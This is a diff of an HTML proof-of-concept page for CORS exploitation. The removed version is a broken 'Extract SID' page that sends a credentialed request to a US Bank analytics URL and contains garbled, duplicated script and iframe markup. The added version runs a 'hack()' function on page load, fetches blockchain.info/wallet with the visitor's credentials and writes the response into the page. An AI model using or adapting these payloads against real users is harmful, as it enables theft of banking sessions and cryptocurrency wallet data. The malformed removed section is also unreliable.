@@ -1,37 +1,28 @@
-<!DOCTYPE html>
 <html>
-<body>
-<center>
-<h2>CORS POC Exploit</h2>
-<h3>Extract SID</h3>
- 
-<div id="demo">
-<button type="button" onclick="cors()">Exploit</button>
-</div>
- 
+<head>
 <script>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-	</script>
-
-<iframe>
-function cors() {
-  var xhttp = new XMLHttpRequest();
-  xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-      document.getElementById("demo").innerHTML = alert(this.responseText);
-    }
-  };
-  xhttp.open("POST", "https://smetrics.usbank.com/b/ss/usbankcom/10/JS-2.12.0/s95225021289673?AQB=1&ndh=1&pf=1&callback=s_c_il[5].doPostbacks&et=1&t=24%2F9%2F2019%2011%3A50%3A3%204%20300&d.&nsid=0&jsonv=1&.d&sdid=6EFD65D0CDEDC01B-061A1A54E227B0A0&mid=86624203216440857181340244663306959729&aid=2ED8DE7B85031333-4000119AC000153D&aamlh=9&ce=UTF-8&ns=usbank&g=https%3A%2F%2Fonlinebanking.usbank.com%2FAuth%2FLogin&c.&vidAPICheck=VisitorAPI%20Present&appNameForSiteCat=OLB&appName_PERS=OLB&uxApp=false&uxNameForSiteCat=desktop&uxName_PERS=desktop&clientNameForSiteCat=standalone&et_dimensions=664x598&et_width=664&et_orientation=landscape&cd.&currentPage=omni%3Alogin%3Aenter%20username%20password&siteSection=login&subSiteSection=login&loginFormat=login%20combine%20username%20%26%20password%7C19.9.3&.cd&EVENTS=event17%2C&.c&events=event17&aamb=RKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y&c3=D%3Dv3&v3=Repeat&c4=11%3A45AM&c6=Thursday&c7=10%2F24%2F2019&v9=prospect&c14=D%3Dg&c16=62&c17=olb%3Aauth%3Alogin&c18=Less%20than%201%20day&c19=4&c24=olb%3Aauth%3Alogin&v27=85e204b612214baca7a79b8d74030068.28_22&c29=https%3A%2F%2Fonlinebanking.usbank.com%2FAuth%2FLogin&v35=D%3DpageName&v37=D%3DUser-Agent&c40=online%20banking&c50=R%20April%202019%7CAM_2.12.0%7C05.14.2019%7CbaseOLB%7CVid_4.0.0&v90=D%3Dg&s=1366x768&c=24&j=1.6&v=N&k=Y&bw=681&bh=615&mcorgid=675616D751E567410A490D4C%40AdobeOrg&AQE=1", true);
-  xhttp.withCredentials = true;
-  xhttp.send();
+function hack()
+{
+var xmlhttp;
+if (window.XMLHttpRequest)
+  {
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.open("GET","https://blockchain.info/wallet", false);
+xmlhttp.withCredentials = true;
+xmlhttp.send();
+if(xmlhttp.status==200)
+{
+var str=xmlhttp.responseText;
+document.write(decodeURIComponent(str));
 }
-</script><script>
-</iframe>
-
-
- 
+}
+</script>
+</head>
+<body onload="hack();">
 </body>
 </html>
